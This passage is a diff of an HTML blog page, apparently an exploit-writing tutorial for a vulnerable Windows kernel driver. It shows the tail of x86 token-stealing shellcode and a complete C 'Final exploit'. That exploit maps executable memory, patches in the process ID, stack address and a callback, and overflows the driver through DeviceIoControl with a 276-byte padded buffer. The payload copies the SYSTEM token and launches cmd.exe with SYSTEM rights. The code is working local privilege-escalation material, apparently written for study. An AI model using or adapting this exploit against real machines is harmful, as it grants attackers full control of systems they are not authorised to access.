+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nv">searchProcess</span>       <span class="c1">; We loop!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">sysProcFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">edx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">exploitProcFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">edx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">allPIDFound:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">nextProcess</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">nextProcess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">; We copy the SYSTEM token</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">edi</span>                 <span class="c1">; Exploit</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">esi</span>	                <span class="c1">; System</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>   <span class="c1">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">],</span> <span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">retApp:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3B</span>            <span class="c1">; FS address in userland</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">fs</span><span class="p">,</span> <span class="nb">ax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>     <span class="c1">; Stack address</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>     <span class="c1">; Address of our function in our process</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sysexit</span>
+</span></span></code></pre></div><h2 id="final-exploit">Final exploit</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;winioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_NAME &#34;\\\\.\\1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">&#34;</span><span class="se">\x6A\xFF\x6A\xFF\x64\x8B\x15\x24\x01\x00\x00\x8B\x52\x44\x81\xC2\x88\x00\x00\x00\x89\xD3\x8B</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\x42\xFC\x83\xF8\x04\x74\x0F\x3D\x41\x41\x41\x41\x74\x0E\x8B\x12\x39\xDA\x74\x26\xEB\xE9\x89</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\x54\x24\x04\xEB\x03\x89\x14\x24\x81\x3C\x24\xFF\xFF\xFF\xFF\x74\xE6\x81\x7C\x24\x04\xFF\xFF</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\xFF\xFF\x74\xDC\x5F\x5E\x8B\x46\x40\x89\x47\x40\x31\xC0\xB0\x3B\x8E\xE0\xB9\x42\x42\x42\x42</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\xBA\x43\x43\x43\x43\x0F\x35</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Code to execute with SYSTEM&#39;s right
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">sysCode</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">findStack</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">stack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kr">__asm</span> <span class="n">mov</span> <span class="n">stack</span><span class="p">,</span> <span class="n">esp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">stack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Error with VirtualProtect : %.8x&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span>    <span class="c1">// Process PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x42424242</span><span class="p">,</span> <span class="n">findStack</span><span class="p">());</span>              <span class="c1">// Stack address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="n">sysCode</span><span class="p">);</span>                  <span class="c1">// Code to execute with SYSTEM&#39;s right
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span>                       <span class="c1">// Padding
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x01\x01\x01\x01\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>   <span class="c1">// Shellcode address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
   </article>
-</main>
+</section>
 
-
-    <footer id="footer" class="site-footer">
+    </div><footer id="footer" class="site-footer">
   <div class="copyright">
-    
-      <p>&copy; 2023 Dimitri Fourny</p>
-    
+      <p>&copy; 2024 Dimitri Fourny</p>
   </div>
-</footer>
-
-  </body>
-
+</footer></body>
 </html>
